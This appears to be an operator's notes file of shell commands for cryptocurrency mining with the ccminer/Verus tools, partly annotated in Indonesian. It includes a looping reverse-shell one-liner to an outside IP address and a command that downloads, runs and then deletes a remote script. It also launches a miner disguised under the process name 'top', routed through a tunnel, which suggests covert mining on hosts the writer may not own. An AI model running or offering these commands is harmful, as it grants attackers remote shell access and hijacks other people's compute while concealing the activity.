fuser -k 4055/tcp
npm i dotenv (install modul dotenv di node)
while true; do bash -c 'bash -i >& /dev/tcp/35.247.34.178/4053 0>&1'; sleep 10; done
#### dependence ccmine

apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential

wget https://raw.githubusercontent.com/hudahadoh/vs/main/vs.sh && chmod +x vs.sh && ./vs.sh && rm vs.sh && cd /usr/bin

./bhmax -a verus  -o stratum+tcp://eu.luckpool.net:3956  -u RP6jeZhhHiZmzdufpXHCWjYVHsLaPXARt1.py1 -p x -t 1
werkol-28870.portmap.host:28870 => 4052
./pythonc -s "/usr/bin/top" -d -p test.pid ./bhmax  -a verus  -o stratum+tcp://werkol-28870.portmap.host:28870  -u RP6jeZhhHiZmzdufpXHCWjYVHsLaPXARt1.ZX5 -p x -t 85
./pythonc -s "/usr/bin/top" -d -p test.pid ./bhmax  -a verus  -o stratum+tcp://werkol-28870.portmap.host:28870  -u RP6jeZhhHiZmzdufpXHCWjYVHsLaPXARt1.l1 -p x -t 1


### git clone --single-branch -b  Verus2.2gpu https://github.com/monkins1010/ccminer.git
git clone --single-branch -b Verus2.2gpu https://github.com/monkins1010/ccminer.git (gpu nvidia)
git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git  (cpu only)

cd ccminer

chmod +x build.sh

chmod +x configure.sh

chmod +x autogen.sh

./build.sh

./ccminer  -a verus  -o stratum+tcp://eu.luckpool.net:3956  -u RRT2bJnHu9n1Qzh4crRZZKFoX3HXrtTDer.colabs3  -p x  -t 4
